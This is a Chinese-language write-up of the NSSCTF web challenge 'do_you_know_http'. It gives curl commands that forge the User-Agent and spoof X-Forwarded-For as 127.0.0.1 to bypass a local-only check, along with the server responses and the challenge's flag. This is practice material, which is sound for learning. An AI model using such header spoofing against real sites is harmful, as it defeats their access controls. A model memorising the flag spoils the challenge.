# do_you_know_http

题目链接：https://www.nssctf.cn/problem/385



解题思路：

题目页面有写：

```
Please use 'WLLM' browser!
```

因此，在请求头部传入User-Agent: WLLM：

```
curl -H "User-Agent: WLLM" -XGET http://node4.anna.nssctf.cn:28255/hello.php -D -
```

得到响应：

```
HTTP/1.1 302 Found
Date: Tue, 13 May 2025 13:39:43 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Location: ./a.php
Content-Length: 7
Content-Type: text/html; charset=UTF-8

success
```

访问响应location里的a.php：

```
curl -H "User-Agent: WLLM" -XGET http://node4.anna.nssctf.cn:28255/a.php -D -
```

得到响应：

```
HTTP/1.1 200 OK
Date: Tue, 13 May 2025 13:39:51 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Length: 64
Content-Type: text/html; charset=UTF-8


You can only read this at local!<br>Your address117.152.92.17
```

利用X-FORWARED-FOR伪造地址：

```
curl -H "User-Agent: WLLM" -H "X-FORWARDED-FOR: 127.0.0.1" -XGET http://node4.anna.nssctf.cn:28255/a.php -D -
```

得到响应：

```
HTTP/1.1 302 Found
Date: Tue, 13 May 2025 13:44:12 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Location: ./secretttt.php
Content-Length: 60
Content-Type: text/html; charset=UTF-8


You can only read this at local!<br>Your address127.0.0.1
```

访问响应里的secretttt.php：

```
curl -H "User-Agent: WLLM" -H "X-FORWARDED-FOR: 127.0.0.1" -XGET http://node4.anna.nssctf.cn:28255/secretttt.php -D -
```

得到flag：

```
HTTP/1.1 200 OK
Date: Tue, 13 May 2025 13:45:12 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Length: 44
Content-Type: text/html; charset=UTF-8

NSSCTF{c41e0066-ea5c-4cb4-9aea-615636a9858d}
```

